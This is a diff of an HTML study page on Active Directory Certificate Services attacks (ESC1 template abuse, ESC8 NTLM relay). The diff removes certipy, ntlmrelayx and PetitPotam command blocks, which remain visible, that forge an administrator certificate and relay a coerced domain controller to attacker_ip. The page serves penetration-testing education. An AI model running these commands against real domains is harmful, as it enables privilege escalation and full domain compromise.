@@ -134,18 +134,10 @@
           fatal flag — <code>ENROLLEE_SUPPLIES_SUBJECT</code> lets the requester name the
           subject. So you request a certificate and simply say the subject is
           <code>administrator@corp.local</code>. The CA issues it. You then use it for PKINIT
-          and receive Administrator's TGT.
+          and receive Administrator's TGT. Every other ESC is a variation on that same theme:
+          some property of a template or the CA lets a low-privileged requester obtain a
+          certificate that authenticates as someone more privileged.
         </p>
-
-        <pre><code># find vulnerable templates
-certipy find -u jdoe@corp.local -p Passw0rd -dc-ip 10.10.10.10 -vulnerable
-
-# ESC1: request a cert as Administrator
-certipy req -u jdoe@corp.local -p Passw0rd -ca CORP-CA \
-  -template VulnTemplate -upn administrator@corp.local
-
-# authenticate with it → TGT + NT hash
-certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10</code></pre>
 
         <h2>ESC8 — the relay path</h2>
 
@@ -155,13 +147,11 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10</code></pre>
           authentication, and if Extended Protection for Authentication is not enforced, that
           NTLM can be relayed. Coerce a domain controller to authenticate, relay it to the CA
           web endpoint, request a certificate for the DC, and turn that into the DC's TGT —
-          domain compromise from a coercion primitive and a missing EPA setting.
+          domain compromise from a coercion primitive and a missing EPA setting. Certipy finds
+          and exploits every ESC class, and the command-level walkthroughs live in the
+          <a href="../vulns.html">Vulns &amp; Misconfigs</a> section under <em>ADCS ESC Abuse</em>
+          (and, for the relay itself, <em>Coercion &amp; NTLM Relay</em>).
         </p>
-
-        <pre><code>ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support \
-  --adcs --template DomainController
-PetitPotam.py -u user -p pass attacker_ip dc01_ip
-certipy auth -pfx dc01.pfx</code></pre>
 
         <h2>Shadow Credentials — the AD CS-adjacent attack</h2>
 
